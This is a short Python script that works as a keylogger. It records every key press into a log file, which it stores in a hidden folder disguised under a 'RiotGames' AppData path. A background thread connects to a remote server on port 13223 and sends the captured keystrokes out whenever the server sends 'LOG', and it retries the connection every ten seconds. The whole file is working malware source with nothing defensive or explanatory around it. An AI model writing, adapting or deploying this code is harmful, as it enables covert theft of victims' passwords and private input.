import socket
import keyboard
import subprocess
from pathlib import Path
import threading
import time

# path to the log file
log_folder = Path.home() / "AppData" / "Roaming" / "RiotGames"
log_folder.mkdir(parents=True, exist_ok=True)
subprocess.run(["attrib", "+h", str(log_folder)])

log_file = log_folder / "log.txt"


# function to log key presses to the log.txt file
def on_key_press(event):
    with log_file.open("a") as f:
        f.write(f"{event.name}")


# handle socket communication
# IP AND PORT GOES HERE
def handle_socket():
    HOST = ""
    PORT = 13223

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                print("Connected to server.")

                # Wait for server commands
                while True:
                    data = s.recv(4096)
                    if not data:
                        print("Connection closed by server.")
                        break

                    command = data.decode("utf-8").strip()
                    print(f"Server says: {command}")

                    # Handle commands from server
                    if command.upper() == "LOG":
                        try:
                            with log_file.open("r") as f:
                                log_data = f.read()
                            s.sendall(log_data.encode("utf-8"))
                            print("Sent log data to server.")
                        except Exception as e:
                            print(f"Error reading log file: {e}")

                    elif command.lower() == "exit":
                        print("Server requested to close the connection.")
                        break

        except (ConnectionRefusedError, socket.error):
            print("Failed to connect to server. Retrying in 10 seconds...")
            time.sleep(10)  # Wait 10 seconds before retrying


# Start a new thread to handle socket communication
socket_thread = threading.Thread(target=handle_socket)
socket_thread.daemon = True
socket_thread.start()

# Start listening to key presses
keyboard.on_press(on_key_press)
keyboard.wait()
